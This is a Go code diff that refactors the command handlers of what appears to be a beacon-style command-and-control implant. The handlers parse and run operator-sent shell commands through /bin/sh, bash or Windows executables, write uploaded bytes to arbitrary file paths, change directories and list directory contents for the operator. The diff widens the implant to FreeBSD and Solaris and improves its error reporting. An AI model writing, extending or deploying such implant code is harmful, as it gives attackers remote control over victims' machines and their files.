@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/binary"
 	"fmt"
-	"io/ioutil"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -42,7 +41,7 @@ const (
 	CALLBACK_PROCESS_COMPLETED = 59 // shell/job completed
 )
 
-func ParseCommandShell(b []byte) (string, []byte) {
+func ParseCommandShell(b []byte) (string, string, []byte) {
 	buf := bytes.NewBuffer(b)
 	pathLenBytes := make([]byte, 4)
 	_, err := buf.Read(pathLenBytes)
@@ -66,9 +65,10 @@ func ParseCommandShell(b []byte) (string, []byte) {
 	cmd := make([]byte, cmdLen)
 	buf.Read(cmd)
 
-	envKey := strings.ReplaceAll(string(path), "%", "")
+	rawPath := string(path)
+	envKey := strings.ReplaceAll(rawPath, "%", "")
 	app := os.Getenv(envKey)
-	return app, cmd
+	return rawPath, app, cmd
 }
 
 // splitArgs splits a command string into tokens, respecting
@@ -114,21 +114,18 @@ func Run(command string) ([]byte, error) {
 	return out, err
 }
 
-func Shell(path string, args []byte) []byte {
+func Shell(path string, args []byte) ([]byte, error) {
 	switch runtime.GOOS {
 	case "windows":
 		args = bytes.Trim(args, " ")
 		argsArray := strings.Split(string(args), " ")
 		cmd := exec.Command(path, argsArray...)
 		out, err := cmd.CombinedOutput()
-		if err != nil {
-			fmt.Sprintf("exec failed with %s\n", err)
-		}
-		return out
+		return out, err
 	case "darwin":
 		path = "/bin/bash"
 		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
-	case "linux":
+	case "linux", "freebsd", "solaris":
 		path = "/bin/sh"
 		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
 	}
@@ -138,11 +135,7 @@ func Shell(path string, args []byte) []byte {
 	argsArray := []string{"-c", string(args)}
 	cmd := exec.Command(path, argsArray...)
 	out, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Sprintf("exec failed with %s\n", err)
-	}
-	return out
-
+	return out, err
 }
 
 func ParseCommandUpload(b []byte) ([]byte, []byte) {
@@ -157,17 +150,14 @@ func ParseCommandUpload(b []byte) ([]byte, []byte) {
 
 }
 
-func Upload(filePath string, fileContent []byte) int {
+func Upload(filePath string, fileContent []byte) error {
 	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
 	if err != nil {
-		return 0
+		return err
 	}
 	defer fp.Close()
-	offset, err := fp.Write(fileContent)
-	if err != nil {
-		return 0
-	}
-	return offset
+	_, err = fp.Write(fileContent)
+	return err
 }
 func ChangeCurrentDir(path []byte, taskID [8]byte) {
 	err := os.Chdir(string(path))
@@ -248,14 +238,18 @@ func File_Browse(b []byte, taskID [8]byte) []byte {
 	}
 	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
 	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
-	files, err := ioutil.ReadDir(dirPathStr)
-	for _, file := range files {
-		modTimeStr = file.ModTime().Format("01/02/2006 15:04:05")
+	entries, err := os.ReadDir(dirPathStr)
+	for _, entry := range entries {
+		info, err := entry.Info()
+		if err != nil {
+			continue
+		}
+		modTimeStr = info.ModTime().Format("01/02/2006 15:04:05")
 
-		if file.IsDir() {
-			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
+		if entry.IsDir() {
+			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, entry.Name())
 		} else {
-			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
+			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", info.Size(), modTimeStr, entry.Name())
 		}
 	}
 	return utilities.BytesCombine(pendingRequest, []byte(resultStr))
